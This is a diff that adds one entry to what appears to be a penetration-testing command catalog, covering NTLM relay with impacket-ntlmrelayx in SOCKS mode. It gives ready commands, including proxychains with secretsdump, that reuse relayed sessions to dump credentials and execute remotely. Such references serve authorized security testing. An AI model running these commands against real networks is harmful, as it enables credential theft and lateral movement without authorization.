@@ -1,0 +1,17 @@
+{
+  "id": "ntlmrelayx-smb-socks",
+  "name": "ntlmrelayx SOCKS Proxy",
+  "command": "impacket-ntlmrelayx -tf <targets.txt> -socks -smb2support",
+  "description": "Run ntlmrelayx in SOCKS mode to keep relayed sessions alive after the initial authentication. Drive them with proxychains + impacket tools (smbexec, secretsdump, smbclient) using -no-pass and the relayed user.",
+  "platform": "linux",
+  "requires": ["no-creds"],
+  "protocols": ["smb", "ntlm"],
+  "tags": ["impacket", "ntlmrelayx", "socks", "relay", "proxychains"],
+  "references": [
+    { "title": "ntlmrelayx SOCKS", "url": "https://www.thehacker.recipes/a-d/movement/ntlm/relay" }
+  ],
+  "examples": [
+    "impacket-ntlmrelayx -tf targets.txt -socks -smb2support",
+    "proxychains impacket-secretsdump CORP/jdoe@10.10.10.10 -no-pass"
+  ]
+}
